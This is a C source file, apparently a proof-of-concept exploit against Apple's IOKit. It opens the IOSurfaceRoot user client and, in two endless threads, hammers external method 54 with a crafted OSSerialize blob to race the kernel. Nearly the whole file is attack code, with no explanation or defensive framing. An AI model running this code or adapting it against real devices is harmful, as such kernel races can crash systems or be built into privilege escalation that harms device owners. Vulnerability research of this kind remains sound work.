#include <stdio.h>
#include <pthread.h>
#include <IOKit/IOKitLib.h>

enum
{
    kOSSerializeDictionary   = 0x01000000U,
    kOSSerializeArray        = 0x02000000U,
    kOSSerializeSet          = 0x03000000U,
    kOSSerializeNumber       = 0x04000000U,
    kOSSerializeSymbol       = 0x08000000U,
    kOSSerializeString       = 0x09000000U,
    kOSSerializeData         = 0x0a000000U,
    kOSSerializeBoolean      = 0x0b000000U,
    kOSSerializeObject       = 0x0c000000U,
    kOSSerializeTypeMask     = 0x7F000000U,
    kOSSerializeDataMask     = 0x00FFFFFFU,
    kOSSerializeEndCollecton = 0x80000000U,
    kOSSerializeBinarySignature = 0x000000d3,
};


io_connect_t glob_conn = 0;
char *inStr = 0;
size_t len = 0;


void *race1() {

if(!inStr || !len || !glob_conn) {
printf("Malformed req!\n");
return NULL;
}

while(1) {
    IOConnectCallMethod(glob_conn,54,0,0,inStr,len,0,0,0,0);
}

return NULL;
}

void *race2() {

if(!inStr || !len || !glob_conn) {
printf("Malformed req!\n");
return NULL;
}

while(1) {
    IOConnectCallMethod(glob_conn,54,0,0,inStr,len,0,0,0,0);
}

return NULL;
}





int main() {
    io_service_t surface = IOServiceGetMatchingService(kIOMainPortDefault, IOServiceMatching("IOSurfaceRoot"));
    if(!surface) {
    printf("IOKit obj doesn't exist???\n");
    return 2;
    }


    io_connect_t conn;
    kern_return_t kr = IOServiceOpen(surface,mach_task_self(),0,&conn);
    if(kr != KERN_SUCCESS) {
    printf("Failed to open userclient!\n");
    return 3;
    }

    glob_conn = conn;

    printf("Opened userclient!\n");
    
    
    uint32_t dict[] = {
        kOSSerializeBinarySignature,
        kOSSerializeArray | kOSSerializeEndCollecton | 1,
        kOSSerializeSymbol | 4 | kOSSerializeEndCollecton,
        0x00414141
    };
    
   
    char *buf = malloc(sizeof(dict) + 12);
    memcpy(buf+12, &dict, sizeof(dict));
    inStr = buf;
    len = sizeof(dict)+12;

    pthread_t th1;
    pthread_t th2;
    pthread_create(&th1,0,race1,0);
    pthread_create(&th2,0,race2,0);

    pthread_join(th1,0);
    pthread_join(th2,0);
    
    
    return 0;
    
}
